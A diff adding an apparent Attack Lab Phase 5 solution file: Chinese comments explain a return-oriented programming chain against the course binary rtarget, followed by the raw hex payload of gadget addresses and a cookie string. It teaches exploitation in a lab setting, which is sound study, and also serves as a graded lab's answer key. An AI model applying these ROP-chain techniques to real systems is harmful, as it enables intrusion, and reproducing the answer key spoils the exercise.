@@ -1,0 +1,96 @@
+/* ===========================================================================
+ * Phase 5: ROP 攻击 — 多 gadget 链调用 touch3("59b997fa")
+ * 目标程序: rtarget (栈不可执行 NX, 栈地址随机化 ASLR)
+ *
+ * 攻击原理:
+ *   目标 = Phase 3: %rdi 指向栈上的 cookie 字符串。
+ *   但没有现成的 "计算 rsp+offset→%rdi" gadget，必须用多个小 gadget 拼。
+ *
+ *   步骤: ① 捕获 %rsp → ② 弹出偏移量 → ③ 求和 → ④ 结果送 %rdi → ⑤ 跳 touch3
+ *
+ *   Farm 中使用的 gadget 零件:
+ *     A: 0x401a06  mov %rsp, %rax; ret           (捕获栈指针)
+ *     B: 0x4019a2  mov %rax, %rdi; ret           (rax→rdi)
+ *     C: 0x4019cc  pop %rax; nop; ret            (从栈弹偏移量)
+ *     D: 0x4019dd  mov %eax, %edx; nop; ret      (eax→edx, 中转)
+ *     E: 0x401a34  mov %edx, %ecx; cmp; ret      (edx→ecx, 中转)
+ *     F: 0x401a13  mov %ecx, %esi; nop;nop; ret  (ecx→esi, 中转)
+ *     G: 0x4019d6  add_xy: lea(%rdi,%rsi,1),%rax (rdi+rsi→rax)
+ *
+ * Q: 怎么找到这些 gadget 的？为什么 D/E/F 看起来是"浪费"的？
+ * A: 系统化方法：
+ *    ① 从 farm 区域找到所有 c3 (ret) 的位置
+ *    ② 从每个 c3 往回看最多 10 字节，反汇编看是什么指令
+ *    ③ 筛选出以 c3 结尾、中间无 crash 指令的有效序列
+ *    ④ 从零件出发设计链，不从理想链出发找零件
+ *    D/E/F 存在是因为 farm 里没有直接的 mov %eax→%esi，只能绕路：
+ *    eax → edx → ecx → esi。那些 nop 和 cmp 是寄居在原指令字节里的
+ *    无害副作用——ROP 不要求 gadget 干净，只要求不崩。
+ *
+ * Q: 偏移量 0x48 是怎么算出来的？
+ * A: add_xy 加的是 gadget A (mov %rsp,%rax) 捕获的 rsp 值。
+ *    Gadget A 执行时 rsp = BUF+0x30（getbuf ret 已经加了 8）。
+ *    字符串在 BUF+0x78。
+ *    偏移 = BUF+0x78 - (BUF+0x30) = 0x48。
+ *
+ *    ★ 陷阱：不是从 pop 之后的 rsp 开始算！
+ *    因为 add_xy 用的是 gadget A/B 锁定的 rsp 值（BUF+0x30），
+ *    这个值在链开头就被捕获了，后续 pop/ret 改变 rsp 不影响它。
+ *
+ * Q: 进入 touch3 时栈对齐正确吗？
+ * A: BUF 是 16 字节对齐的（getbuf 的 sub $0x28 从对齐的 rsp 减 40）。
+ *    BUF + 0x78 = 16n + 120 = 16n + 16*7 + 8。
+ *    rsp % 16 = 8 → 符合 ABI 要求。无需额外的对齐 gadget。
+ *
+ * Q: 字符串会不会被 hexmatch 的栈帧覆盖？
+ * A: touch3 进入时 rsp = BUF+0x78（正好在字符串起始处）。
+ *    touch3 的 push %rbx 写入 BUF+0x70~0x77（字符串之前），不覆盖字符串。
+ *    hexmatch 的 push/sub 全部向低地址方向（BUF+0x68 往下），
+ *    字符串在 BUF+0x78（高地址侧），完全安全。与 Phase 3 同理。
+ *
+ * 栈布局 (完整):
+ *   BUF+0x00 ┌── 40B 填充 ────┐
+ *   BUF+0x28 ├── A: 0x401a06 ──┤  mov %rsp, %rax; ret
+ *   BUF+0x30 ├── B: 0x4019a2 ──┤  mov %rax, %rdi; ret  ★rdi=rsp=BUF+0x30
+ *   BUF+0x38 ├── C: 0x4019cc ──┤  pop %rax; nop; ret
+ *   BUF+0x40 ├── 偏移量 0x48 ──┤  被 pop 进 %rax
+ *   BUF+0x48 ├── D: 0x4019dd ──┤  mov %eax, %edx; nop; ret
+ *   BUF+0x50 ├── E: 0x401a34 ──┤  mov %edx, %ecx; ...; ret
+ *   BUF+0x58 ├── F: 0x401a13 ──┤  mov %ecx, %esi; nop;nop; ret  ★esi=0x48
+ *   BUF+0x60 ├── G: 0x4019d6 ──┤  add_xy → rax = rdi+esi = BUF+0x78
+ *   BUF+0x68 ├── B: 0x4019a2 ──┤  mov %rax, %rdi; ret  ★rdi=字符串地址
+ *   BUF+0x70 ├── touch3 0x4018fa┤
+ *   BUF+0x78 └── "59b997fa\0" ─┘  字符串
+ *
+ * 执行流 (9 个 ret 串成链):
+ *   getbuf ret → A → B → C(弹出0x48) → D → E → F → G(加法) → B → touch3
+ *
+ *   寄存器变化:
+ *     A: rax = BUF+0x30
+ *     B: rdi = BUF+0x30
+ *     C: rax = 0x48
+ *   D-F: 0x48 经 edx→ecx→esi 中转
+ *     G: rax = BUF+0x30 + 0x48 = BUF+0x78 (字符串地址!)
+ *     B: rdi = BUF+0x78
+ *   ret → touch3(rdi) → hexmatch → strncmp → 匹配 → PASS
+ *
+ * 测试: cat phase5.txt | ./target1/hex2raw | ./target1/rtarget -q
+ * =========================================================================== */
+
+00 00 00 00 00 00 00 00  /* 填充 0~7   */
+00 00 00 00 00 00 00 00  /* 填充 8~15  */
+00 00 00 00 00 00 00 00  /* 填充 16~23 */
+00 00 00 00 00 00 00 00  /* 填充 24~31 */
+00 00 00 00 00 00 00 00  /* 填充 32~39 */
+
+06 1a 40 00 00 00 00 00  /* [A] mov %rsp,%rax; ret       @ 0x401a06 */
+a2 19 40 00 00 00 00 00  /* [B] mov %rax,%rdi; ret       @ 0x4019a2 */
+cc 19 40 00 00 00 00 00  /* [C] pop %rax; nop; ret       @ 0x4019cc */
+48 00 00 00 00 00 00 00  /* 偏移量 = 0x48 (BUF+0x78 - BUF+0x30)        */
+dd 19 40 00 00 00 00 00  /* [D] mov %eax,%edx; nop; ret  @ 0x4019dd */
+34 1a 40 00 00 00 00 00  /* [E] mov %edx,%ecx; ...; ret  @ 0x401a34 */
+13 1a 40 00 00 00 00 00  /* [F] mov %ecx,%esi; nop;nop;ret @ 0x401a13 */
+d6 19 40 00 00 00 00 00  /* [G] add_xy (rdi+rsi→rax);ret @ 0x4019d6 */
+a2 19 40 00 00 00 00 00  /* [B] mov %rax,%rdi; ret  (第二次使用)       */
+fa 18 40 00 00 00 00 00  /* touch3 @ 0x4018fa                         */
+35 39 62 39 39 37 66 61 00  /* "59b997fa\0" — cookie hex 字符串      */
